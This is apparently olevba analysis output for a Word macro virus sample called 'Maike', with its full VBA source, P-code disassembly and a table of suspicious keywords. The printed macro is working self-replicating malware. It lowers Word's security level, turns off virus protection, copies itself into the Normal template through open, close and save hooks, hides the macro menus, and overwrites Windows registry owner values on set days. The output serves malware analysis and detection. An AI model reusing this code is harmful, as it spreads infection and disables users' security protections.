olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ekaim
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ekaim - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Maike.bas 
in file: Virus.MSWord.Ekaim - OLE stream: 'Macros/VBA/Maike'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Dim sSysdir As String

Sub Maike()
On Error Resume Next

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 0&

Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros = 0

Options.VirusProtection = False
Options.SaveNormalPrompt = False
 
 sSysdir = Space$(256)
 GetSystemDirectory sSysdir, Len(sSysdir)
 sSysdir = Left$(sSysdir, InStr(sSysdir, Chr$(0)) - 1)
 sSysdir = sSysdir + "\Maike.sys"

Application.VBE.ActiveVBProject.VBComponents("Maike").Export sSysdir

For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "Maike" Then NormInstall = True
Next I

For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "Maike" Then ActivInstall = True
Next I

If ActivInstall = True And NormInstall = False Then Set MIMI = NormalTemplate.VBProject _
Else If ActivInstall = False And NormInstall = True Then Set MIMI = ActiveDocument.VBProject
MIMI.VBComponents.Import (sSysdir)

If Day(Now()) = 1 Or Day(Now()) = 14 Or Day(Now()) = 28 Then Love

' This stupid Macro is coded from Vampir and many grezz to my friends and Maike the little good looking girl
'               VIRIINAME: MAIKE
End Sub

Sub Love()
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Maike you are": System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "the most beautiful": System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "ProductId") = "girl in the world"
End Sub

Sub suppe()
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub


Sub FileSave()
    On Error Resume Next
    Call Maike
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call Maike
End Sub

Sub AutoOpen()
    On Error Resume Next
    Call Maike
    Call suppe
End Sub

Sub AutoClose()
    On Error Resume Next
    Call Maike
End Sub

Sub ToolsMacro()
    On Error Resume Next
End Sub
Sub FileTemplates()
    On Error Resume Next
End Sub
Sub ViewVBCode()
    On Error Resume Next
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ekaim
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Maike - 5257 bytes
' Line #0:
' 	FuncDefn (Private Declare Function GetSystemDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #1:
' 	Dim 
' 	VarDefn sSysdir (As String)
' Line #2:
' Line #3:
' 	FuncDefn (Sub Maike())
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' Line #6:
' 	LitDI4 0x0000 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #7:
' Line #8:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #9:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	MemSt DisableAutoMacros 
' Line #10:
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #13:
' Line #14:
' 	LitDI2 0x0100 
' 	ArgsLd Space$ 0x0001 
' 	St sSysdir 
' Line #15:
' 	Ld sSysdir 
' 	Ld sSysdir 
' 	FnLen 
' 	ArgsCall GetSystemDirectory 0x0002 
' Line #16:
' 	Ld sSysdir 
' 	Ld sSysdir 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	St sSysdir 
' Line #17:
' 	Ld sSysdir 
' 	LitStr 0x000A "\Maike.sys"
' 	Add 
' 	St sSysdir 
' Line #18:
' Line #19:
' 	Ld sSysdir 
' 	LitStr 0x0005 "Maike"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #20:
' Line #21:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #22:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Maike"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstall 
' 	EndIf 
' Line #23:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #24:
' Line #25:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #26:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Maike"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActivInstall 
' 	EndIf 
' Line #27:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' Line #29:
' 	LineCont 0x0004 0F 00 00 00
' 	Ld ActivInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set MIMI 
' 	Else 
' 	BoSImplicit 
' 	Ld ActivInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set MIMI 
' 	EndIf 
' 	EndIf 
' Line #30:
' 	Ld sSysdir 
' 	Paren 
' 	Ld MIMI 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #31:
' Line #32:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Or 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001C 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Love 0x0000 
' 	EndIf 
' Line #33:
' Line #34:
' 	QuoteRem 0x0000 0x006B " This stupid Macro is coded from Vampir and many grezz to my friends and Maike the little good looking girl"
' Line #35:
' 	QuoteRem 0x0000 0x001F "               VIRIINAME: MAIKE"
' Line #36:
' 	EndSub 
' Line #37:
' Line #38:
' 	FuncDefn (Sub Love())
' Line #39:
' 	LitStr 0x000D "Maike you are"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	BoS 0x0000 
' 	LitStr 0x0012 "the most beautiful"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	BoS 0x0000 
' 	LitStr 0x0011 "girl in the world"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0009 "ProductId"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #40:
' 	EndSub 
' Line #41:
' Line #42:
' 	FuncDefn (Sub suppe())
' Line #43:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #44:
' 	EndSub 
' Line #45:
' Line #46:
' Line #47:
' 	FuncDefn (Sub FileSave())
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	ArgsCall (Call) Maike 0x0000 
' Line #50:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub FileSaveAs())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #55:
' 	ArgsCall (Call) Maike 0x0000 
' Line #56:
' 	EndSub 
' Line #57:
' Line #58:
' 	FuncDefn (Sub AutoOpen())
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	ArgsCall (Call) Maike 0x0000 
' Line #61:
' 	ArgsCall (Call) suppe 0x0000 
' Line #62:
' 	EndSub 
' Line #63:
' Line #64:
' 	FuncDefn (Sub AutoClose())
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	ArgsCall (Call) Maike 0x0000 
' Line #67:
' 	EndSub 
' Line #68:
' Line #69:
' 	FuncDefn (Sub ToolsMacro())
' Line #70:
' 	OnError (Resume Next) 
' Line #71:
' 	EndSub 
' Line #72:
' 	FuncDefn (Sub FileTemplates())
' Line #73:
' 	OnError (Resume Next) 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub ViewVBCode())
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	EndSub 
' Line #78:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

